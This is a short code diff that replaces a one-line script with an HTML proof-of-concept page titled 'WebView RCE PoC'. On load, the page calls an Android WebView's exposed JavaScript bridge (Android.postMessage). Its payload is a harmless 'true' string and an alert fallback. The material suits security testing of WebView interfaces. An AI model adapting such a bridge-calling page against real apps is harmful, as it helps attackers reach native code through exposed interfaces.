@@ -1,3 +1,21 @@
-<script>
-    OSAndroid.postMessage(alert(1));
-</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>WebView RCE PoC</title>
+    <script>
+      // Wait for the page to fully load before executing
+      window.onload = function () {
+        // Trigger native code via the exposed JS interface
+        if (window.Android && Android.postMessage) {
+          Android.postMessage("true");
+        } else {
+          alert("Android.postMessage not available");
+        }
+      };
+    </script>
+  </head>
+  <body>
+    <h1>WebView Native Execution PoC</h1>
+    <p>This page calls <code>Android.postMessage("true")</code> on load.</p>
+  </body>
+</html>
